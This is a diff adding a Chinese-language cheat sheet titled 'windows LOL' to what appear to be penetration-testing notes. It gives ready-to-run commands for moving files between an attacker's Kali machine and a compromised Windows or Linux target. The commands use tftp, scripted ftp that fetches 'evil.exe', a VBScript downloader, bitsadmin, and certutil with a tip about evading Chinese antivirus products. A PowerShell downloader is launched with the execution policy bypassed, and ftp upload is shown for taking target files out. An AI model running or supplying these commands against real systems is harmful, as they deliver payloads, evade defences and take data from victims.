@@ -305,5 +305,133 @@ kerberos::list
 尝试挂载到自己盘下执行成功。
 
 
+# windows LOL
+
+## 文件传输
+
+攻击主机：kali      目标机器:windows/linux
+
+### tftp
+
+基于udp,端口为69
+
+攻击机起tftp:
+mkdir /tftp
+atftpd --daemon --port 69 /tftp
+cp /usr/share/windows-binaries/nc.exe /tftp/
+chown -R nobody /tftp
+
+目标机:
+tftp -i kali-ip GET nc.exe
+
+
+### ftp
+
+攻击机:
+apt-get install pure-ftpd
+```setup-ftp
+#!/bin/bash
+
+groupadd ftpgroup
+useradd -g ftpgroup -d /dev/null -s /etc ftpuser
+pure-pw useradd username -u ftpuser -d /ftphome
+pure-pw mkdb
+cd /etc/pure-ftpd/auth/
+ln -s ../conf/PureDB 60pdb
+mkdir -p /ftphome
+chown -R ftpuser:ftpgroup /ftphome/
+/etc/init.d/pure-ftpd restart
+```
+./setup-ftp(输入要设置的密码)
+```ftp-commands
+echo open kali-ip 21> ftp.txt
+echo username>> ftp.txt
+echo password>> ftp.txt
+echo bin >> ftp.txt
+echo GET evil.exe >> ftp.txt
+echo bye >> ftp.txt
+ftp -s:ftp.txt
+```
+把ftp-commands文件中的内容粘贴到目标机的远程shell上去运行
+
+目标机上传文件(连接状态):
+ftp> put target.exe(如果是windows且文件在其他盘,需使用绝对路径)
+
+关闭ftp:
+/etc/init.d/pure-ftpd stop
+
+攻击机使用python起ftp:
+apt-get install python-pyftpdlib
+mkdir /ftp
+cd /ftp/
+python -m pyftpdlib -p 21
+此时目标机连接的时候,用户名为anonymous,密码随意
+
+
+### vbscript
+
+```wget-vbs
+echo strUrl = WScript.Arguments.Item(0) > wget.vbs
+echo strFile = WScript.Arguments.Item(1) >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
+echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
+echo Err.Clear >> wget.vbs
+echo Set http = Nothing >> wget.vbs
+echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
+echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
+echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
+echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
+echo http.Open "GET",strURL,False >> wget.vbs
+echo http.Send >> wget.vbs
+echo varByteArray = http.ResponseBody >> wget.vbs
+echo Set http = Nothing >> wget.vbs
+echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
+echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
+echo strData = "" >> wget.vbs
+echo strBuffer = "" >> wget.vbs
+echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
+echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
+echo Next >> wget.vbs
+echo ts.Close >> wget.vbs
+```
+攻击机起http服务:
+cp exploit.exe /var/www/
+service apache2 start
+
+在目标机执行wget-vbs中的命令,会生成wget.vbs
+目标机执行:
+dir wget.vbs
+cscript wget.vbs http://kali-ip/exploit.exe (要下载的文件)exploit.exe(保存成的文件名)
+
+
+### bitsadmin
+
+系统要求 >= Windows Vista
+bitsadmin /transfer down /download /priority normal "http://www.xxx.com/xxx.exe" "F:\1.exe"
+
+
+### certutil
+
+建议先执行一遍 certutil,再执行下方命令(可能可以绕火绒、360等杀软)
+certutil -urlcache -split -f http://www.xxx.com/xxx.exe 1.exe
+
+
+### powershell
+
+同样,攻击机起http服务
+```powershell-download
+echo $storageDir =$pwd > wget.ps1
+echo $webclient = New-Object System.Net.WebClient >>wget.ps1
+echo $url = "http://kali-ip/exploit.exe" >>wget.ps1
+echo $file = "new-exploit.exe" >>wget.ps1
+echo $webclient.DownloadFile($url,$file) >>wget.ps1
+```
+在目标机执行powershell-download中的命令,会生成wget.ps1
+目标机执行:
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+
 
 
